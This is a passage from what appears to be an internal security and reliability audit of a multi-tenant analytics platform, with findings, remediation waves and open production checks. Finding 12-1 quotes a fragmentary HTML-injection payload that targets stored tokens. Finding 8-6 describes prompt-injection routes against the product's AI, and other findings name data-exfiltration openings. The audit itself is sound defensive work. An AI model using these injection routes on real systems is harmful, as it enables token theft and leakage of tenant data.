| 7-5 | Reaper holes: `transformation_runs`, `product_tables.transformation_status='running'`, `pipeline_runs`, bus-matrix builds, email schedules are cleaned only at process startup (`index.ts:471-490`) | | ½ day |
| 7-6 | No reconciliation: nothing compares warehouse counts or sums with the source; `row_counts` records what was written, never what the source has | | 2 days — per-entity `$count` vs warehouse count, shown on the source card |
| 7-7 | AI repair can rewrite a fact to drop a failed dimension (`transformationRunner.ts:484-501, 621-675`) and persist it | | refuse a repair that removes a JOIN |
| 7-8 | Legacy ETL incremental appends duplicates (`etl/main.py:387-392`, `mode="append"`, no upsert); the path is live (`infra/main.tf:567-596`, `IngestionWizard`) | | disable the path for new sources, or upsert |

### Domain 8 — AI governance (beyond P0-4)

| ID | Finding | Evidence | Fix |
|---|---|---|---|
| 8-1 | The `email-report` worker lacks `withTenantAiContext` (`workers.ts:509-517`; the other six workers wrap it) → scheduled narratives are unbudgeted and unattributed. (Moot while P0-2 keeps them from firing; live the moment P0-2 is fixed) | | 1 line |
| 8-2 | Cost log records the pre-override model: `effectiveModel` is used for the call (`AIService.ts:426`) but `model` for metrics and `logAiCall` (`:457, :480`) — per-category overrides misstate cost | | 1 word |
| 8-3 | No eval harness, golden questions or correctness metric anywhere; the feedback loop ends at a `definition_gaps` row. Every prompt edit is an unmeasured bet on the product's core claim | | 3–5 days — 30 golden questions over the sample DB, run nightly, repair-rate per tenant |
| 8-4 | `aiLimiter` covers `/api/query` and two dashboard endpoints (`index.ts:274, 279`); `/products` refine/build, `/semantic`, `/investigations`, `/briefs`, `/build`, `/reports` are not AI-rate-limited — one scripted loop exhausts a budget in minutes and turns it into an outage of every AI feature for the tenant | | ½ day |
| 8-5 | No SDK timeout on any call (`AIService.ts:236`; default 10 min, retried) | | 1 line |
| 8-6 | No delimiting of customer-controlled text in prompts (`nlToSqlPrompt.ts:305-313`, table/column names, sampled values, glossary, grid cells); the guard contains the worst case, but answer-text exfiltration past a mask, dashboard steering and self-reported confidence inflation are live integrity risks | | 1 day — fence untrusted sections, instruct the model, and re-check confidence server-side where possible |
| 8-7 | `parseJson` returns uncast, unchecked output when no schema is passed (`:799`), at ~15 of ~25 sites; `AI_STRUCTURED_OUTPUTS` still off | | incremental |

### Domain 9 — product & UX

| ID | Finding | Evidence | Fix |
|---|---|---|---|
| 9-1 | No `error.tsx`, `not-found.tsx` or `global-error.tsx` anywhere under `frontend/app` — any render throw or mistyped URL is the stock Next.js page with no way back | 0 results | ½ day |
| 9-2 | Exact Online requires the customer to register their own OAuth app: `preAuthFields: clientId, clientSecret, division, baseUrl` (`exactonline/oauth.ts:159`); the schema says "Paste from Postman" (`schema.ts:38-43`). An SMB owner cannot complete this unaided | ≥8 manual steps from register to first answer | either a Clarion-owned Exact app (partner registration) or a wizard page that walks them through it |
| 9-3 | `/home` is an operator console for every role: no `RequireRole`; viewers see "Definitions 12/40 tables", "Pipelines", "AI suggestions pending review", and a Freshness button that pushes to `/pipelines` — a page gated to analyst+ → "not authorized" card. The worst first impression for the ten colleagues, on the page every login lands on (`app/page.tsx:60`) | `app/home/page.tsx:207, 263-265, 288, 443-452` | 1 day — a viewer-shaped home |
| 9-4 | Not usable on a phone: `AppShell` is `h-screen overflow-hidden` with a permanent rail and no drawer (`components/layout/AppShell.tsx:37-49`); 100 responsive utilities across 192 components | | 2 days for read-only dashboard + Ask on mobile |
| 9-5 | `/dev/widgets` and `/dev/ui` ship to production unauthenticated (no guard, no `middleware.ts`) | | 10 minutes |
| 9-6 | English only, `lang="en"`, ~1,066 hardcoded strings, three number locales in use (`en-GB` 86, `nl-BE` 17, `en-US` 4 — `SourceCard.tsx:30`) — **owner-deferred** (PR #114 holds the mechanism) | | — |
| 9-7 | `/onboarding` is a 606-line dead page rendering fake tables, referenced from nowhere — **owner-deferred**; should at least be deleted so it cannot be reached | | 5 minutes |

### Domain 10 — quality engineering

| ID | Finding | Evidence | Fix |
|---|---|---|---|
| 10-1 | The core loop — sync → Parquet → transform → query — has zero end-to-end coverage; `SyncOrchestrator` and `transformationRunner` have no test; no backend test opens DuckDB (`tests/ask-surfaces-smoke.test.ts:25` says so) | 17 of 38 routers untested, incl. `policies`, `settings`, `email-schedules`, `pipelines`, `jobs`, `schedules` | 3 days — one DuckDB-backed test over the sample DB through a real transformation and one query |
| 10-2 | Nothing runs under the production role except two e2e specs; Redis and Neo4j are never exercised (`setup.ts` forces `REDIS_URL=''`); Anthropic is short-circuited under `VITEST` with no recorded responses | this is why P0-2 shipped | extend `rls-isolation` (P0-2 fix) |
| 10-3 | The seven lint ratchets do not gate deploy (`lint.yml` is not in `gate`'s wait); the `.catch()`-in-shared-transaction class of bug can deploy with lint red | | 10 minutes in `deploy.yml` |
| 10-4 | No migration rollback test; migrations run while the old revision serves | ties to P0-9 | |
| 10-5 | No browser journey in CI — `smoke.spec.ts` (the only login → navigate) never runs; the auth interceptor and token refresh in `lib/api.ts` are untested | | ½ day |
| 10-6 | Tests are type-checked nowhere (`tsconfig.build.json` excludes them, `strict: false`, `noImplicitAny: false`); `ignoreBuildErrors` persists | | ½ day |

### Domain 11 — performance & headroom

| ID | Finding | Evidence | Fix |
|---|---|---|---|
| 11-1 | `requireAuth` opens a Knex transaction held until `res.end` (`middleware/auth.ts:183-244`) — every SSE stream (`/think` `query.ts:1277`, `batch-execute-stream` `dashboards.ts:1168`, build stream `build.ts:579`) pins a Postgres connection for its whole life as `idle in transaction` on a 1-vCore server. Ten open streams on a replica → the 11th request waits 30 s and 500s | pool max 10 | 1 day — SSE routes take tenant context from `tenantQuery` per query and release the request transaction before streaming |
| 11-2 | `DuckDBPool` holds 12 entries (`DuckDBPool.ts:33`); per-tenant containers mean ~1 per tenant per layer → constant eviction past ~12 tenants, each reload paying cold init plus one `CREATE VIEW` per table (60 for Exact Online) | | raise per replica memory and cap; measure |
| 11-3 | `widgetCache` and `filterOptionsCache` are uncapped `Map`s with no sweeper (`widgetCache.ts:18`, `filterOptionsCache.ts:34`) | `utils/cache.ts:23` gets it right | ½ day |
| 11-4 | `/home/summary` runs ~15 sequential counts; `source_columns` is indexed on `(table_id)` only and `query_log` on `(created_at)` only, so the RLS predicate is a heap scan across all tenants' rows (`migration 29:17, 40`) | | ½ day — `(tenant_id, …)` indexes, one CTE |
| 11-5 | `/admin/tenants` fans out one transaction per tenant with `Promise.all` over up to 200 (`adminTenants.ts:137-138`) against a 10-connection pool | | batch of 5 |
| 11-6 | Schedule storms have no jitter; the morning brief loops serially over every tenant at concurrency 1 (`morningBriefJob.ts:58`); sync crons are stored verbatim; `connection-sync-schedule` concurrency 4 launches ACA jobs with no global cap | | ½ day |
| 11-7 | The global DuckDB semaphore has no acquisition timeout (`DuckDBConnector.ts:361`) — the 45 s timer starts after the permit; three tenants opening 8-widget dashboards take all 6 permits and the fourth hangs | | 1 line |
| 11-8 | Exact Online connector has no proactive pacing (only `maxRetries: 10`, `ExactOnlineConnector.ts:261-273`); a 62-entity full sync spends its wall clock in backoff against the 30-minute job ceiling | Odoo already uses `requestsPerSecond` | 1 line |

### Domain 12 — application security hardening

| ID | Finding | Evidence | Fix |
|---|---|---|---|
| 12-1 | HTML injection into an `about:blank` window that inherits the app origin: `StoryModal.tsx:84-144` string-interpolates the AI narrative, headline and the dashboard title into a document written with `document.write` into `window.open('')`. A dashboard title (user-set, tenant-shared) or a narrative derived from a synced customer-name column can carry `<img onerror=…>` and runs with access to the tokens in `localStorage` | | ½ day — escape, or render into a sandboxed blob URL |
| 12-2 | No security headers on frontend pages: `next.config.mjs` defines no `headers()`, there is no `middleware.ts`; Helmet protects only `/api/*`. Every app page can be framed; Pyodide loads from jsdelivr with no CSP and no SRI (`usePyodide.ts:46-49`) | | ½ day (shared with 2-5) |
| 12-3 | Report emails are a spam and exfiltration vector: `routes/emailSchedules.ts:71-82, 120-126` checks `recipients` only for non-empty array — no format, cap or domain rule; `POST /:id/send-now` (`:169`) sends tenant data to any address at any volume from the platform's domain. `cron_expression` is handed to BullMQ unparsed (`emailScheduler.ts:35`; contrast `connectionSyncSchedules.ts:43`), so one malformed pattern throws inside `loadEmailSchedules()` at boot | | ½ day |
| 12-4 | Terraform state backend commented out (`main.tf:37-42`): a local `terraform.tfstate` holds `jwt_secret`, `pg_admin_password`, `credentials_encryption_key`, `neo4j_password` and the ACR admin password in plaintext on whichever machine ran apply, with no locking | ties to P0-9 | part of the state-backend move |
| 12-5 | Security events are logged but only brute force is alertable: no signal for guard refusals, API-token failures, budget blocks or ownership refusals (`middleware/rateLimitStore.ts:135-145` is the only such line) | | ½ day — four log lines + four rules |

What is solid here, and it is most of the domain: Helmet CSP in production
with `frame-ancestors` and HSTS (`index.ts:102-118`); CORS that fails closed
when unset (`config.ts:57`); body limits scoped to two prefixes
(`index.ts:136-141`); every `knex.raw` interpolation numerically coerced;
Cypher fully parameterised; DuckDB identifiers regex-guarded at every
interpolation; the sync worker spawned with a minimal env allowlist and a
0600 config file (`orchestrator/JobLauncher.ts:108`); connector egress
allowlists where empty means deny (`HttpClient.ts:303-330`); direct-DB hosts
checked against metadata ranges (`utils/netGuard.ts`); the SQLite connector
sandboxed to a directory with a real containment check
(`SqliteConnector.ts:26-41`); `requireJwtSecret()` refusing the shipped
default in production; and `scripts/audit-gate.mjs`, which requires a written
reason per allowlist entry and reports stale ones. Twelve unauthenticated
endpoints exist and every one sits behind a limiter; `resend-verification`
has only the 20/min IP bucket. The validate-coverage ratchet sits at exactly
its baseline of 159 unvalidated mutating routes — it has never been lowered.

---

## 5. P2 — worth knowing, not worth blocking on

- **Commercial:** budget exhaustion is silent to the operator (`trackEvent` only) and the user gets a 429 pointing at an admin who has no budget screen; cost is USD with no FX; `ai_call_log` is pruned at 365 days while Belgian bookkeeping keeps seven years; the budget check fails open on a DB error (`aiBudget.ts:118-121`).
- **Legal:** `query_log`/`conversation_messages` retention defaults to 0 (off) while the privacy draft says "for the subscription term"; no default PII masking (policies are opt-in); `docs/SECURITY-AUDIT-2026-05-14.md:179` still carries "SOC 2 scheduled" copy; email goes from the Azure managed `donotreply@` domain, custom-domain DNS not wired (`main.tf:1298-1300`).
- **Reliability:** Dependabot skips `worker/`, `packages/connectors/`, `etl/` and Docker; base images pinned by major only; Terraform default for `WAREHOUSE_CONTAINER_MODE` is `per-tenant` while the code default is `shared` (`paths.ts:60`) and the per-tenant write path has only mocked coverage; `DUCKDB_RUNNER=child` is applied via `.ops` but absent from `main.tf`, so a future apply reverts it, and its `runner-active` log line has never been observed (`.ops/prod-logs`).
- **Identity:** no per-account limiter on `/auth/mfa/verify` and the 5-minute challenge is reusable (`auth.ts:730-752`); register has no brute limiter or captcha and returns 409 on an existing email (enumeration); unverified accounts are never cleaned up; password policy is length-8 only; `POST /users/profile/password` does not clear a pending reset token; deactivate/demote have no last-admin check (only erase does); reactivate can re-enable an erased user (`users.ts:283`); no device/session list.
- **Observability:** no impersonation banner; no customer-facing "is my data current / is the platform up" page (`/health` redirects to catalog trust); no freshness SLA, no client RUM, no App Insights sampling.
- **Data platform:** Azure product tables always overwrite regardless of `load_mode`; Delta product tables are never OPTIMIZE/VACUUMed; a division change is accepted with no warehouse re-key; local merge does `unlink` + `rename`.
- **AI:** no fallback model or deprecation handling (`claude-sonnet-4-6` is previous-generation; the Haiku id is date-suffixed); sampled values go to Anthropic unmasked; opt-out is whole-backend.
- **UX:** verification and reset emails are unbranded `<p>` fragments (`signup.ts:104-110`, `auth.ts:537-542`); accessibility ≈ C− (0 `sr-only`, reduced-motion honoured in 1 file vs 173 animations, `--muted-2` at ~3.2:1 on 10–11.5 px text); one global `<title>`, no `robots.txt`/manifest/OG image; Excel manifest still says `clarion.example.com`; raw driver errors on the sources card (`sources/page.tsx:911`); ~12 bare `catch {}` in `dashboards/page.tsx`; orphan routes `/security`, `/excel-addin`, `/gaps`, `/health`, `/ask`.
- **Security:** boot does not fail on a default secret (`requireJwtSecret()` throws on first use, so a bad deploy passes `/api/health` and is promoted); the OAuth `redirect_uri` base falls back to the Host header (`routes/sources.ts:173-177`); backend pino redaction is a 7-path allowlist; `.env.example` ships exactly the `JWT_SECRET` the blocklist refuses.
- **Quality:** `workflow_dispatch` deploys skip the gate by design; the local vitest and Playwright DBs share a name; 18 test files read the wall clock.
- **Performance:** cold start unmeasured (backend `min 0` + Neo4j `min 0` at 30–60 s + DuckDB extension load) with no warm-up path; no load test of any kind exists.

---

## 6. Remediation — three waves, sequenced by what unblocks what

The first assessment's wave 3 is still stopped by owner decision; nothing here
reopens it. These waves are new and sit before it.

### Wave A — the platform tells the truth (≈ 2 weeks, one engineer)

**Exit gate:** a schedule set by a customer fires under the production role and
CI proves it; a failed entity is a visible `partial`; a masked column is masked
on every surface; the customer's second user receives an email and logs in.

0. **P0-1** Fix the guard's identifier handling, add the reproduced cases as
   tests, log and alert on refusals, switch session lockdown on. Half a day;
   nothing else in this wave starts before it is merged.
1. **P0-2** Loaders under `tenantQuery`; `sendScheduledReport` takes a tenant;
   `rls-isolation` boots as `databridge_app` and asserts each loader reports
   `1`. Run the §8 production check first — it decides whether this is a
   regression to announce to existing users.
2. **P0-3** Invite email; verified-on-redeem; red-first test.
3. **P0-4 + 1-1** One execute helper — policies, then guard, then run — on all
   seven read paths and the six unguarded execution sites.
4. **P0-5** `tenantQuery` on the eleven session-level SET sites; delete the
   request-path fallback; a ratchet for session-level SET.
5. **P0-6** `partial` status + alert; empty-overwrite guard; full re-sync per
   connection/entity; deletion reconciliation for incremental entities.
6. **2-1** Move `/users/profile` above `/:id`. **2-2** Refuse destructive acts
   under `impersonatedBy` and show a banner. **8-1, 8-2, 8-5, 11-7**: the four
   one-liners.
7. **10-1 + 10-2** The DuckDB-backed core-loop test and the app-role CI job.
   These are what would have caught items 1 and 4.

### Wave B — operate and support without a database session (≈ 2 weeks)

**Exit gate:** the operator can find a customer's error, cancel their stuck job,
tell all customers about an incident, and produce a month-end usage export —
each from a screen. The DR infrastructure exists and one restore has been
rehearsed.

1. **P0-9** State backend + import + apply (owner); `pg_dump` before
   `migrate-sql`; migrate-then-rollback in CI; the §6 rehearsal.
2. **P0-8** Customer record on `tenants`; caps on users/connections/schedules;
   15-minute minimum sync interval; monthly usage CSV.
3. **6-1, 6-2, 6-4, 6-5, 6-6** Correlation id; recent-errors endpoint with a
   tenant filter; announcements banner; operator user-admin; queue cancel and
   a retry policy with a dead-letter queue.
4. **5-1, 5-2, 5-3, 5-5** Uptime test; SMS/webhook receiver and a failed-syncs
   threshold; pool sizing per role; Redis `maxmemory`.
5. **7-1, 7-3, 7-5** Failure notifications and a freshness rule; rollup
   refresh on the Delta path; reaper coverage.
6. **2-4, 4-4** Auth events audited; audit retention and export.
7. **11-1** Release the request transaction before streaming.

### Wave C — lawful and sellable (parallel, mostly owner and counsel)

**Exit gate:** a customer accepts an in-force ToS + DPA at signup; the
subprocessor list matches what the browser and backend actually contact; a
tenant can export its data.

1. **P0-7** Lawyer review → placeholders filled → `LEGAL_IN_FORCE = true` →
   acceptance table + checkbox → data export job. Start on day one; it runs
   longer than everything else.
2. **4-1, 4-2, 4-3** Incident runbook; self-hosted fonts and Pyodide; AI
   opt-out mode.
3. **9-1, 9-3, 9-5** Error pages; a viewer-shaped home; hide `/dev/*`.
4. **8-3** The eval harness — the one wave C item that is engineering rather
   than paperwork, and the one that decides whether AI quality is manageable
   after launch.
5. Then, and only on the owner's say-so, the stopped wave 3: NL/FR, the
   first-run flow (9-2's Exact app registration belongs here), SSO, status
   page.

---

## 7. What is ahead of schedule — still true, and grown

The previous list stands (data engine, deployment discipline, auth primitives,
compute containment, GDPR mechanics, release control). Added since, each
verified this pass:

- **`purgeTenant` discovers tenant tables from `information_schema` at run
  time** (`accountDeletion.ts:120-124`) — coverage cannot drift from
  migrations. The right design, and rarer than it should be.
- **AI budget enforcement with no bypass**, context propagated through
  AsyncLocalStorage into six of seven workers, pricing verified correct
  including cache multipliers.
- **`sqlSelfHeal`** — one repair, re-guarded, re-policied, policy-count
  regression treated as evasion. The pattern P0-4 should be generalised from.
- **PII hygiene in logs** — no question text, prompt bodies, SQL values or
  connector configs reach a log line; sync errors pass through `redact()`
  before persistence.
- **Per-tenant DuckDB fairness with correct lock ordering**, pool refcounting
  with deferred close, divided runner memory budgets, cache-bus invalidation
  across replicas.
- **The first assessment's controls held**: every wave 1/2 item re-verified
  in code, not one regressed.

---

## 8. Limits, corrections, and the production checks owed

**Rejected during verification.** The performance investigation reported that
the 45-second DuckDB query timeout "does not exist in production" because
`infra/main.tf` never sets `DUCKDB_RUNNER`. That is half right: `.ops/duckdb-runner`
is `child` and the GitOps control applies it with `az`, outside Terraform. The
finding survives only as the P2 drift note above. Everything else in this
document was either verified by hand or is stated with its evidence so it can
be.

**Not established from the repository — one check each:**

1. **Whether scheduled work has fired since 2026-08-06** (P0-2). Read the
   backend boot log for `Loaded N enabled connection-sync schedule(s)` and
   `[email-scheduler] loaded schedules` on the current revision and compare
   with the enabled rows. If `N` is 0 with rows present, every customer's
   schedule has been silent for a month and the fix is a regression notice,
   not just a fix.
2. **Whether any `tenant-*` container has taken writes** (carried over from the
   first assessment; `.ops/infra-preflight` section 5 reports it).
3. **Whether the `runner-active` line has ever appeared** (`.ops/prod-logs`).
4. **Whether the uptime web test was ever created in the portal** (5-1).
5. **Postgres `backup_retention_days` and geo-redundancy on the live server**
   (`infra/main.tf:86-87` describes a server that predates the HCL).

Effort figures are for one experienced engineer and exclude the legal work,
which runs in parallel and is bounded by counsel, not code.
